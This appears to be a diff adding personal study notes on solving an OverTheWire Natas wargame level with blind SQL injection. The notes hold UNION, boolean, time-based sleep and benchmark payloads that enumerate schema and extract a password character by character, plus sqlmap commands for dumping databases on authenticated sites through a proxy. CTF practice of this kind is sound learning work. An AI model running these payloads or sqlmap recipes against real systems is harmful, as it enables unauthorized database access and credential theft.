@@ -1,0 +1,33 @@
+select *from users where username=natas" UNION ALL SELECT 1,2;#
+we dont now how many colums are using. the * number of colums must be same as union all select colums must be same 
+natas" UNION ALL SELECT 1,2 FROM INFORMATION_SCHEMA.tables WHERE  table_schema !="mysql" 
+AND table_schema != "information_schema " AND table_schema !="performance_schema"AND 
+substring(table_name,1,1) ="a";#
+users tables
+natas" UNION ALL SELECT 1,2 FROM INFORMATION_SCHEMA.columns WHERE  table_name="users" AND 
+substring(column_name,1,1) ="a";#
+puasesrsnwaomrde
+natas" UNION ALL SELECT 1,2 FROM INFORMATION_SCHEMA.columns WHERE  table_name="users" AND
+substring(column_name,1,1) ="a"AND substring(column_name,2,1) = "a" LIMIT 1 OFFSET 0;#
+password
+username
+natas" UNION ALL SELECT 1,2 FROM users WHERE  username="natas16" AND
+substring(password,1,1) =BINARY "a";#
+next level 
+the full blind sql injection is done by sleep method 
+eg:
+   natas' AND sleep(100); -- or # or even you can use 
+   natas" AND benchmark(md5(1), 1000)
+
+
+
+
+SQLI tools 
+sqlmap -r sqltest.txt --dump  ==> sqktest.txt means post page of login mainly used  
+sqlmap -u -crawl -forms --dbmsnm 
+sqlmap -r/-l --cookie --proxy 
+sqlmap --user-agent --referer 
+sqlmap  --schema --exculed-sysdbs --dbs/-table / -colums -d/-t
+sqlmap --all --dump  --dump-all --count --search
+to run on  authendicated website
+sqlmap -u "https://tcxsandbox.com/search?q=hello" --cookie="past copied data here " -proxy https://localhost: 8080 --batch 
